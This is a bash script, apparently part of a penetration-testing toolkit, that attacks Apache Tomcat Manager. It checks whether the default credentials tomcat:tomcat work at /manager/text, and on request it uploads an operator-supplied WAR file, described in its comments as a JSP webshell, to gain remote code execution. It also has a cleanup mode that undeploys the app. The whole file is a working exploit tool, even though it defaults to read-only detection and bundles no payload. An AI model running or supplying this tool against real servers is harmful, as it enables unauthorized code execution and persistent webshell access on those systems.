#!/usr/bin/env bash
# tomcat-war-deploy.sh — deploy an operator-supplied WAR to Tomcat Manager (RCE).
#
# The default-creds sweeper's flagship finding is "Tomcat Manager tomcat:tomcat ->
# WAR-deploy RCE", but it left the actual deploy step to hand-curling. This helper
# performs it, mirroring the openfire / jolokia "you bring the payload" model:
#   - detect    (default) — probe /manager/text and report reachability + auth
#   - deploy    (--exploit) — PUT an operator-supplied .war, print the JSP URL
#   - undeploy  (--undeploy) — remove a previously-deployed context (cleanup)
#
# SAFETY (CLAUDE.md §9): default is read-only detect. Deploy/undeploy MUTATE the
# target and REQUIRE --exploit / --undeploy respectively. No payload is bundled —
# you supply --war (build your own JSP webshell with your engagement's scoping).

set -uo pipefail

C_G=$'\033[1;32m'; C_Y=$'\033[1;33m'; C_R=$'\033[1;31m'; C_RST=$'\033[0m'
[ -t 1 ] || { C_G=""; C_Y=""; C_R=""; C_RST=""; }
hit()  { printf "%s[+]%s %s\n" "$C_G" "$C_RST" "$*"; }
warn() { printf "%s[!]%s %s\n" "$C_Y" "$C_RST" "$*"; }
err()  { printf "%s[!!]%s %s\n" "$C_R" "$C_RST" "$*" >&2; }

URL=""; USER="tomcat"; PASS="tomcat"; WAR=""; CTX=""; INSECURE=""
MODE="detect"

usage() {
    cat <<EOF
Usage: $0 --url http[s]://host:8080 [--user U --pass P] [--path /ctx] [options]

  --url URL         Tomcat base URL (manager is expected at <URL>/manager/text)
  --user U          manager username (default: tomcat)
  --pass P          manager password (default: tomcat)
  --path /ctx       context path to deploy/undeploy as (default: random)
  --war FILE        operator-supplied .war to deploy (required for --exploit)
  --exploit         DEPLOY the WAR (writes to target — §9 gate)
  --undeploy        UNDEPLOY --path (writes to target — §9 gate)
  --insecure        skip TLS verification (self-signed engagement certs)
  -h, --help
EOF
}

while [ $# -gt 0 ]; do
    case "$1" in
        --url)       URL="$2"; shift 2 ;;
        --user|-u)   USER="$2"; shift 2 ;;
        --pass|-p)   PASS="$2"; shift 2 ;;
        --war)       WAR="$2"; shift 2 ;;
        --path)      CTX="$2"; shift 2 ;;
        --exploit)   MODE="deploy"; shift ;;
        --undeploy)  MODE="undeploy"; shift ;;
        --insecure)  INSECURE="-k"; shift ;;
        -h|--help)   usage; exit 0 ;;
        *) err "unknown arg: $1"; usage; exit 1 ;;
    esac
done

[ -z "$URL" ] && { err "--url required"; usage; exit 1; }
command -v curl >/dev/null 2>&1 || { err "curl not installed"; exit 1; }
URL="${URL%/}"
MGR="$URL/manager/text"
# shellcheck disable=SC2206  # intentional: build curl auth args as an array
AUTH=(-u "$USER:$PASS")
CURL=(curl -s $INSECURE --connect-timeout 8 --max-time 60)

# --- detect: is the manager reachable and do the creds work? ---
detect() {
    local body code
    body=$("${CURL[@]}" "${AUTH[@]}" -o - -w '\n%{http_code}' "$MGR/list" 2>/dev/null)
    code=$(printf '%s' "$body" | tail -1)
    case "$code" in
        200) hit "Tomcat Manager reachable + creds valid ($USER:$PASS) at $MGR"
             printf '%s\n' "$body" | sed '$d' | head -20
             return 0 ;;
        401|403) warn "Manager present but $USER:$PASS rejected (HTTP $code) — try other default creds"
             return 1 ;;
        404) warn "No /manager/text at $URL (text manager disabled or different path)"
             return 1 ;;
        000) err "$URL unreachable"; return 2 ;;
        *)   warn "Unexpected HTTP $code from $MGR/list"; return 1 ;;
    esac
}

case "$MODE" in
    detect)
        detect
        exit $?
        ;;
    deploy)
        [ -z "$WAR" ] && { err "--exploit requires --war FILE (you supply the payload)"; exit 1; }
        [ -r "$WAR" ] || { err "WAR not readable: $WAR"; exit 1; }
        [ -z "$CTX" ] && CTX="/aranum_$RANDOM"
        case "$CTX" in /*) ;; *) CTX="/$CTX" ;; esac
        detect || { err "aborting deploy — manager not reachable/authed"; exit 3; }
        warn "Deploying $WAR as context $CTX (MUTATES target) ..."
        resp=$("${CURL[@]}" "${AUTH[@]}" -T "$WAR" "$MGR/deploy?path=$CTX&update=true" 2>/dev/null)
        printf '%s\n' "$resp"
        if printf '%s' "$resp" | grep -qi '^OK'; then
            hit "Deployed. App base: $URL$CTX/"
            hit "Undeploy when done:  $0 --url '$URL' --user '$USER' --pass '$PASS' --path '$CTX' --undeploy"
        else
            err "Deploy did not return OK — see response above"
            exit 4
        fi
        ;;
    undeploy)
        [ -z "$CTX" ] && { err "--undeploy requires --path /ctx"; exit 1; }
        case "$CTX" in /*) ;; *) CTX="/$CTX" ;; esac
        resp=$("${CURL[@]}" "${AUTH[@]}" "$MGR/undeploy?path=$CTX" 2>/dev/null)
        printf '%s\n' "$resp"
        printf '%s' "$resp" | grep -qi '^OK' && hit "Undeployed $CTX" || { err "Undeploy did not return OK"; exit 4; }
        ;;
esac
